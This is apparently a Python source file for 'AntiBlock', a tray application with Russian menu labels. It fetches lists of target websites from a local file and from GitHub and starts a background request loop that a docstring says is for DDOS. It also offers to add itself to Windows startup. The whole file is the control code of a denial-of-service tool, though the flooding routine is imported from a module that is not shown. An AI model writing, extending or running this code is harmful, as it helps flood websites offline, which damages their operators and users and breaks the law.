from threading import Thread
import os
import platform
import sys

from pystray import Icon, Menu, MenuItem
from PIL import Image

from cli import requests_cycle
from utils.targets_finder import TargetsFinder
from utils.autorun import add_to_startup, remove_from_startup, is_in_startup

# Get targets from json
targets = TargetsFinder.get_targets_from_json()
network_targets = TargetsFinder.get_targets_from_github()
PROGRAM_NAME = "AntiBlock"

def stop():
    "Stop program working"
    os.environ["stop"] = str(True)
    tray.stop()
    
def change_targets():
    network_menu_item = tray.menu.items[1]
    if network_menu_item.checked:
        network_menu_item._checked = lambda _: False
        tray.menu._items[0]._action = Menu(*menu_items.values())
        os.environ["targets"] = str(targets)
    else:
        network_menu_item._checked = lambda _: True
        tray.menu._items[0]._action = Menu(*git_menu_items.values())
        os.environ["targets"] = str(network_targets)
    
def switch(icon, self):
    "Select or deselect url for DDOS"
    if self.checked:
        self._checked = lambda _: False
    else:
        self._checked = lambda _: True
    
    network_menu_item = tray.menu.items[1]
    if not network_menu_item.checked:
        new_targets = targets.copy()
    else:
        new_targets = network_targets.copy()
        
    for item_key in menu_items.keys():
        if not menu_items[item_key].checked:
            new_targets.pop(item_key)
    os.environ["targets"] = str(new_targets)

def change_autorun(icon, self):
    if self.checked:
        self._checked = lambda _: False
        remove_from_startup(PROGRAM_NAME)
    else:
        self._checked = lambda _: True
        add_to_startup(PROGRAM_NAME, sys.executable)
        
# Creating tray menu
menu_items = {}
for icon, url in targets.items():
    h = lambda : switch(icon)
    menu_items[icon] = MenuItem(icon, switch, radio=True, checked=lambda _: True)
# Creating tray menu for list from github
git_menu_items = {}
for name, url in network_targets.items():
    git_menu_items[name] = MenuItem(name, switch, radio=True, checked=lambda _: True)
    
os.environ["targets"] = str(network_targets)
    
icon = Image.open("icons/RKN.png")
in_sturtup = is_in_startup(PROGRAM_NAME)
tray = Icon(PROGRAM_NAME, icon, menu=Menu(
        MenuItem("Сайты", Menu(
            *git_menu_items.values()
            )
        ),
        MenuItem("Цели с GitHub", change_targets, radio=True, checked=lambda _: True),
        MenuItem("Автозапуск", change_autorun, radio=True, checked=lambda _: in_sturtup) if platform.system() == "Windows" else None,
        MenuItem("Закрыть", stop)
    ),
    title=PROGRAM_NAME
)

if __name__ == "__main__":
    request_sender = Thread(target=requests_cycle)
    request_sender.start()
    tray_process = Thread(target=tray.run)
    tray_process.start()